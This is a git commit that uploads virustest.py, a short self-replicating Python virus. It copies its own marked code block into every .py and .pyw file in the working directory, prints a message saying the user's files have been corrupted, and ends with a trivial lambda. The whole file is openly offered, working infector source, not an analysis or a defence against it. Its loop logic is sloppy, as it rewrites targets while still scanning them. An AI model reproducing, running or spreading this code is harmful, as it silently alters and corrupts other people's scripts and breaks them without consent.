d3cd478c794f18b17de83453bbcec53712e89a99
harigovind011235 <75135295+harigovind011235@users.noreply.github.com>
2020-12-04 13:23:28 +0530

    Add files via upload

---
+++ virustest.py
@@ -0,0 +1,59 @@
+###START###
+
+import sys,glob
+
+code = []
+
+with open(sys.argv[0],'r') as f:
+
+    lines = f.readlines()
+
+virus_area = False
+
+for line in lines:
+
+    if line == "###START###\n":
+
+        virus_area = True
+
+    if virus_area:
+
+        code.append(line)
+
+    if line == "###END###\n":
+
+        break
+
+python_scripts = glob.glob("*.py") + glob.glob("*.pyw")
+print(python_scripts)
+
+for script in python_scripts:
+    with open(script,'r') as f:
+        script_code = f.readlines()
+
+    infected = False
+
+    for line in script_code:
+
+        if line == "###START###\n":
+            infected = True
+            break
+
+        if not infected:
+            final_code = []
+            final_code.extend(code)
+            final_code.extend("\n")
+            final_code.extend(script_code)
+
+        with open(script,'w') as f:
+
+            f.writelines(final_code)
+
+print("Hello Your Files Has Been Corrupted")
+
+
+###END###
+
+x = lambda a:a*100
+
+print(x(100))
